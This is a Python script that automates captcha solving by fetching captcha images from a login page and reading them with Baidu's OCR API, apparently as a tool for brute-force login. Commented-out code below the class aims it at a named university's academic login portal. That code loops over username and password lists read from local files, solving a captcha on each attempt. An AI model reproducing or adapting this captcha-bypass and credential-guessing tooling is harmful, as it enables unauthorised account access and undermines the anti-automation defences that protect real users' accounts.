import sys
import requests
import base64

class BruteCaptcha():

    def __init__(self,img_path,url_path,access_token,code_len=4):
        self.img_path = img_path
        self.url_path = url_path
        self.code_len = code_len
        self.access_token = access_token
        self.char_set = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
        self.code = 'xxxx'


    def get_yzm(self):
        url = self.url_path
        ret = requests.get(url=url)
        f = open(self.img_path,'wb')
        f.write(ret.content)
        f.close()

    def reg_yzm(self):
        # 高精度
        #request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
        # 标准精度
        request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic"
        # 二进制方式打开图片文件
        f = open(self.img_path, 'rb')
        img = base64.b64encode(f.read())

        params = {"image": img}
        request_url = request_url + "?access_token=" + self.access_token
        headers = {'content-type': 'application/x-www-form-urlencoded'}
        response = requests.post(request_url, data=params, headers=headers)

        try:
            if response.json()["error_msg"] == 'Access token expired':
                print("授权过期,请获取新的access_token")
                sys.exit()
        except KeyError:
            pass

        if response:
            self.code = response.json()['words_result'][0]['words']

    def is_vail_yzm(self):
        vail = False
        yzm = self.code.strip()

        if len(yzm)==self.code_len:
            cnt = 0
            for char in yzm:
                if char in self.char_set:
                    cnt+=1
            if cnt == self.code_len:
                vail = True
        return vail

    def brute(self):
        self.get_yzm()
        self.reg_yzm()
        if self.is_vail_yzm():
            return self.code
        else:
            return None




#if is_vail_yzm(code):

# cookie = 'UM_distinctid=177f71041ab171-0f512def929d87-4c3f227c-1fa400-177f71041ac4b5'
# #获取验证码
# url = url_path + 'default2.aspx'
# header = {
#     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
#     'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
#     'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
#     'Accept-Encoding':'gzip, deflate',
#     'Content-Type':'application/x-www-form-urlencoded',
#     'Content-Length':'221',
#     'Origin':'http://jw.hhstu.edu.cn',
#     'Connection':'close',
#     'Referer':url,
#     'Cookie':cookie,
#     'Upgrade-Insecure-Requests':'1'
# }
#
# user_file = open(r'C:\Users\Administrator\Desktop\1.txt','r')
# users = user_file.readlines()
# user_file.close()
# pwd_file = open(r'C:\Users\Administrator\Desktop\2.txt','r',encoding='utf-8')
# pwds = pwd_file.readlines()
# pwd_file.close()
#
# for i in range(len(users)):
#
#     user = users[i][0:-1]
#     print(user)
#
#     pwd = pwds[i][0:-1]
#     print(pwd)
#
#     while True:
#         while True:
#             get_yzm()
#             gif_to_png()
#             yzm = reg_yzm().strip()
#             all = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
#             if len(yzm)==4:
#                 cnt = 0
#                 for e in yzm:
#                     if e in all:
#                         cnt+=1
#                 if cnt == 4:
#                     break
#
#
#         if len(err_msg)==10:
#             print(yzm + '验证码不正确！')















